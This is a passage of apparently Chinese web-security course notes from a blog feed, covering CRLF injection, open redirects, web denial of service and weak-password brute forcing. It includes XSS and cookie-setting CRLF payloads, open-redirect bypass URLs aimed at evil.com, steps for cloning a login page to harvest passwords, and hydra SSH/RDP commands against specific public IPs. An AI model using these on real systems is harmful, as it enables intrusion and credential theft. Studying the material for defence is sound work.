title="2.URL重定向跳转"></a>2.URL重定向跳转</h4><p>写代码时没有考虑过任意URL跳转漏洞，或者根本不知道&#x2F;不认为这是个漏洞;</p><p>写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过;</p><p>对传入参数做一些奇葩的操作(域名剪切&#x2F;拼接&#x2F;重组)和判断，适得其反，反被绕过; </p><p>原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过;</p><p>原始语言、服务器&#x2F;容器特性、浏览器等对标准URL协议解析处理等差异性导致绕过;</p><h4 id="3-Web拒绝服务"><a href="#3-Web拒绝服务" class="headerlink" title="3.Web拒绝服务"></a>3.Web拒绝服务</h4><p>现在有许多资源是由服务器生成然后返回给客户端的，而此类“资源生成”接口如若有参数可以被客户端控制（可控），并没有做任何资源生成大小限制，这样就会造成拒绝服务风险，导致服务器处理不过来或占用资源去处理。</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ CRLF注入-原理&amp;检测&amp;利用</p><p>➢ URL重定向-原理&amp;检测&amp;利用</p><p>➢ WEB拒绝服务-原理&amp;检测&amp;利用</p><h4 id="案例1-CRLF注入原理-amp-检测-amp-利用"><a href="#案例1-CRLF注入原理-amp-检测-amp-利用" class="headerlink" title="#案例1-CRLF注入原理&amp;检测&amp;利用"></a>#案例1-CRLF注入原理&amp;检测&amp;利用</h4><p>vulhub nginx</p><p>尝试在get &#x2F;后面写上aaaaa</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310142547321.png" alt="image-20230310142547321"></p><p>发现返回的Location里面也有</p><p>构造payload:%0aSet-cookie:JSPSESSID%3Ddrops,发现可以设置cookie</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310144654316.png" alt="image-20230310144654316"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">构造pyload:url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br></pre></td></tr></table></figure><p>发现换行将img写入了页面标签中造成了xss</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310144738596.png" alt="image-20230310144738596"></p><p>此漏洞扫描工具CRLFuzz：<a href="https://github.com/dwisiswant0/crlfuzz/releases">https://github.com/dwisiswant0/crlfuzz/releases</a></p><p>如果出现此标记，则存在漏洞</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310145217725.png" alt="image-20230310145217725"></p><h4 id="案例2-URL重定向-amp-原理-amp-检测-amp-利用"><a href="#案例2-URL重定向-amp-原理-amp-检测-amp-利用" class="headerlink" title="#案例2-URL重定向&amp;原理&amp;检测&amp;利用"></a>#案例2-URL重定向&amp;原理&amp;检测&amp;利用</h4><p>举例url:<a href="http://xxx/zb_system/login.php?url=http://www.xiaodi8.com/zb_system/login.php">http://xxx/zb_system/login.php?url=http://www.xiaodi8.com/zb_system/login.php</a></p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310145828542.png" alt="image-20230310145828542"></p><p>修改成<a href="http://www.baidu.com看是否跳转/">www.baidu.com看是否跳转</a></p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310151249497.png" alt="image-20230310151249497"></p><p>跳转成功</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310151316003.png" alt="image-20230310151316003"></p><p>大概意思是讲重定向漏洞的危害：网站接受用户输入的链接，跳转到一个攻击者控制的网站，可能导致跳转过去的用户被精心设置的钓鱼页面骗走自己的个人信息和登录口令。国外大厂的一个任意URL跳转都500$、1000$了，国内看运气~ </p><p>业务：</p><p>用户登录、统一身份认证处，认证完后会跳转</p><p>用户分享、收藏内容过后，会跳转</p><p>跨站点认证、授权后，会跳转</p><p>站内点击其它网址链接时，会跳转</p><p>设置钓鱼的原理：</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310150120061.png" alt="image-20230310150120061"></p><p>将要钓鱼伪装的页面的html源码右键另存为下载下来</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310150541219.png" alt="image-20230310150541219"></p><p>搭建在自己的服务器上，并且可以在Index.html里面写上窃取信息的代码，如xss窃取等</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310150729169.png" alt="image-20230310150729169"></p><p>在index中看接受用户名和密码的参数，这里改为1.php文件，写入php代码接受用户名和密码</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310151941212.png" alt="image-20230310151941212"></p><p>(或者将所有地方的账号密码参数改成自己想要设置的，假设是user,pass)</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310152617160.png" alt="image-20230310152617160"></p><p>并更改登录的账号密码存储的地址，每个地方的action都改一下</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310151917112.png" alt="image-20230310151917112"></p><p>这里的x.php负责接受账号密码并且保存为文本</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310152901697.png" alt="image-20230310152901697"></p><p>对应次处</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310152956532.png" alt="image-20230310152956532"></p><p>登录后接受成功</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310153031897.png" alt="image-20230310153031897"></p><h5 id="黑盒看参数名："><a href="#黑盒看参数名：" class="headerlink" title="黑盒看参数名："></a>黑盒看参数名：</h5><p>redirect</p><p>redirect_to</p><p>redirect_url</p><p>url</p><p>jump</p><p>jump_to</p><p>target</p><p>to</p><p>link</p><p>linkto</p><p>domain</p><h5 id="白盒看代码块："><a href="#白盒看代码块：" class="headerlink" title="白盒看代码块："></a>白盒看代码块：</h5><p>Java：response.sendRedirect(request.getParameter(“url”))</p><p>PHP:</p><p>$redirect_url &#x3D; $_GET[‘url’];</p><p>header(“Location: “ . $redirect_url)</p><p>.NET:</p><p>string redirect_url &#x3D; request.QueryString[“url”];</p><p>Response.Redirect(redirect_url);</p><p>Django:</p><p>redirect_url &#x3D; request.GET.get(“url”)</p><p>HttpResponseRedirect(redirect_url)</p><p>Flask:</p><p>redirect_url &#x3D; request.form[‘url’]</p><p>redirect(redirect_url)</p><p>Rails:</p><p>redirect_to params[:url]</p><p>1.单斜线”&#x2F;“绕过 <a href="https://www.landgrey.me/redirect.php?url=/www.evil.com">https://www.landgrey.me/redirect.php?url=/www.evil.com</a> </p><p>2.缺少协议绕过 <a href="https://www.landgrey.me/redirect.php?url=//www.evil.com">https://www.landgrey.me/redirect.php?url=//www.evil.com</a> </p><p>3.多斜线”&#x2F;“前缀绕过 <a href="https://www.landgrey.me/redirect.php?url=///www.evil.com">https://www.landgrey.me/redirect.php?url=///www.evil.com</a> <a href="https://www.landgrey.me/redirect.php?url=www.evil.com">https://www.landgrey.me/redirect.php?url=www.evil.com</a> </p><p>4.利用”@”符号绕过 <a href="https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com">https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com</a>  </p><p>5.利用反斜线”&quot;绕过 <a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com%5Cwww.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me</a> 6. 利用”#”符号绕过 <a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me</a> 7. 利用”?”号绕过 <a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me</a> </p><p>8.利用”\“绕过 <a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com%5C%5Cwww.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me</a> </p><p>9.利用”.”绕过 <a href="https://www.landgrey.me/redirect.php?url=.evil">https://www.landgrey.me/redirect.php?url=.evil</a>      (可能会跳转到<a href="http://www.landgrey.me.evil域名/">www.landgrey.me.evil域名</a>) <a href="https://www.landgrey.me/redirect.php?url=.evil.com">https://www.landgrey.me/redirect.php?url=.evil.com</a>    (可能会跳转到evil.com域名) </p><p>10.重复特殊字符绕过 <a href="https://www.landgrey.me/redirect.php?url=///www.evil.com//">https://www.landgrey.me/redirect.php?url=///www.evil.com//</a>.. <a href="https://www.landgrey.me/redirect.php?url=www.evil.com//">https://www.landgrey.me/redirect.php?url=www.evil.com//</a>..</p><h4 id="案例3-WEB拒绝服务-原理-amp-检测-amp-利用"><a href="#案例3-WEB拒绝服务-原理-amp-检测-amp-利用" class="headerlink" title="#案例3-WEB拒绝服务-原理&amp;检测&amp;利用"></a>#案例3-WEB拒绝服务-原理&amp;检测&amp;利用</h4><p>1、验证码或图片显示自定义大小</p><p>2、上传压缩包解压循环资源占用</p><p>危害：会造成cpu爆满</p><p>1、当图片是w和h都是100，不占用cpu</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310153415903.png" alt="image-20230310153415903"></p><p>非常大时，cpu占用变大，可能会导致站点崩溃</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310153530465.png" alt="image-20230310153530465"></p><p>2、</p><p>假设网站有自动解压的功能，例如以下时解压的代码</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310153739992.png" alt="image-20230310153739992"></p><p>上传一个压缩包里面有压缩包…的压缩包，访问，cpu直接拉满</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310153859920.png" alt="image-20230310153859920"></p>]]></content>
      
      
      <categories>
          
          <category> Web攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day52 WEB攻防-通用漏洞&amp;弱口令安全&amp;社工字典生成&amp;服务协议&amp;Web应用</title>
      <link href="/2023/03/09/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/"/>
      <url>/2023/03/09/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、弱口令安全&amp;配置&amp;初始化等</p><p>2、弱口令对象&amp;Web&amp;服务&amp;应用等</p><p>3、弱口令字典&amp;查询&amp;列表&amp;列表等</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令，通常与管理的安全意识和平台的初始化配置等相关，通过系统弱口令，可被黑客直接获得系统控制权限。</p><p>在常见的安全测试中，弱口令会产生安全的各个领域，包括Web应用，安全设备，平台组件，操作系统等；如何获取弱口令，利用弱口令成为了此类安全问题的关键！</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ Web类-加密&amp;验证码后台猜解</p><p>➢ 服务类-SSH&amp;RDP远程终端猜解</p><p>➢ 应用类-ZIP&amp;Word文件压缩包猜解</p><p>➢ 字典类-密文收集&amp;弱口令&amp;自定义生成</p><h4 id="Web类-加密-amp-验证码后台猜解"><a href="#Web类-加密-amp-验证码后台猜解" class="headerlink" title="#Web类-加密&amp;验证码后台猜解"></a>#Web类-加密&amp;验证码后台猜解</h4><p><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p><h5 id="1、Zblog-密文MD5传输加密猜解"><a href="#1、Zblog-密文MD5传输加密猜解" class="headerlink" title="1、Zblog-密文MD5传输加密猜解"></a>1、Zblog-密文MD5传输加密猜解</h5><p>登录密码为md5加密</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309153303271.png" alt="image-20230309153303271"></p><p>发送到intruder模块，先添加字典，再选择要对字典加密的方式</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309153515688.png" alt="image-20230309153515688"></p><p>此处option还可以进行线程的设置</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309153629159.png" alt="image-20230309153629159"></p><p>这个模式可以设置两个变量同时爆破</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309153942778.png" alt="image-20230309153942778"></p><h5 id="2、Seacms-登录验证码识别猜解"><a href="#2、Seacms-登录验证码识别猜解" class="headerlink" title="2、Seacms-登录验证码识别猜解"></a>2、Seacms-登录验证码识别猜解</h5><p>登录的时候抓包</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154205665.png" alt="image-20230309154205665"></p><p>发送到intruder模式下设置密码和验证码为变量，选择Pitchfork模式（admin是正确登录账号）</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154407125.png" alt="image-20230309154407125"></p><p>在验证码的payload设置时</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154622756.png" alt="image-20230309154622756"></p><p>使用插件</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154655038.png" alt="image-20230309154655038"></p><p>随后右击验证码图片复制其地址</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154802351.png" alt="image-20230309154802351"></p><p>在intruder数据包里添加xiapao:验证码图片链接</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154928377.png" alt="image-20230309154928377"></p><p>点开始</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309155240511.png" alt="image-20230309155240511"></p><h4 id="服务类-SSH-amp-RDP远程终端猜解"><a href="#服务类-SSH-amp-RDP远程终端猜解" class="headerlink" title="#服务类-SSH&amp;RDP远程终端猜解"></a>#服务类-SSH&amp;RDP远程终端猜解</h4><p><a href="https://github.com/vanhauser-thc/thc-hydra%EF%BC%88%E4%B9%9D%E5%A4%B4%E8%9B%87%EF%BC%89">https://github.com/vanhauser-thc/thc-hydra（九头蛇）</a></p><p>hydra是一个自动化的爆破工具，暴力破解弱密码，</p><p>是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可</p><p>-s PORT 可通过这个参数指定非默认端口。</p><p>-l LOGIN 指定破解的用户，对特定用户破解。</p><p>-L FILE 指定用户名字典。</p><p>-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</p><p>-P FILE 大写，指定密码字典。</p><p>-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</p><p>-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L&#x2F;-P参数。</p><p>-M FILE 指定目标列表文件一行一条。</p><p>-o FILE 指定结果输出文件。</p><p>-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</p><p>-t TASKS 同时运行的线程数，默认为16。</p><p>-w TIME 设置最大超时的时间，单位秒，默认是30s。</p><p>-v &#x2F; -V 显示详细过程。</p><p>server 目标ip</p><p>service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</p><p>shell7连接本地的kali，将脚本置于kali上（事先探针远程端口以判断用什么协议）</p><h6 id="爆破linux"><a href="#爆破linux" class="headerlink" title="爆破linux:"></a>爆破linux:</h6><p>hydra -l root -P UserPassCombo-Jay.txt -t 5 -vV 47.110.73.12 ssh -f</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309160107079.png" alt="image-20230309160107079"></p><p>爆破出来后用shell7连接即可</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309160148030.png" alt="image-20230309160148030"></p><h6 id="爆破windows"><a href="#爆破windows" class="headerlink" title="爆破windows:"></a>爆破windows:</h6><p>hydra -l administrator -P UserPassCombo-Jay.txt -t 5 -vV 47.99.218.105 rdp -f</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309160319881.png" alt="image-20230309160319881"></p><p>爆破后输入cmd命令mstsc连接即可</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309160426565.png" alt="image-20230309160426565"></p><h4 id="应用类-ZIP-amp-WORD文件压缩包猜解"><a href="#应用类-ZIP-amp-WORD文件压缩包猜解" class="headerlink" title="#应用类-ZIP&amp;WORD文件压缩包猜解"></a>#应用类-ZIP&amp;WORD文件压缩包猜解</h4><p>PassFab for Word</p><p>Advanced Archive Password Recovery </p><h4 id="字典类-密文收集-amp-弱口令-amp-自定义生成"><a href="#字典类-密文收集-amp-弱口令-amp-自定义生成" class="headerlink" title="#字典类-密文收集&amp;弱口令&amp;自定义生成"></a>#字典类-密文收集&amp;弱口令&amp;自定义生成</h4><p><a href="https://monitor.firefox.com/">https://monitor.firefox.com</a> 国外</p><p><a href="https://haveibeenpwned.com/">https://haveibeenpwned.com</a> 国外</p><p><a href="https://www.bugku.com/mima">https://www.bugku.com/mima</a></p><p><a href="https://reg007.com/">https://reg007.com</a>  查询邮箱绑定过的网站</p><p><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a> 收集近年一些平台使用习惯最多的弱口令</p><p><a 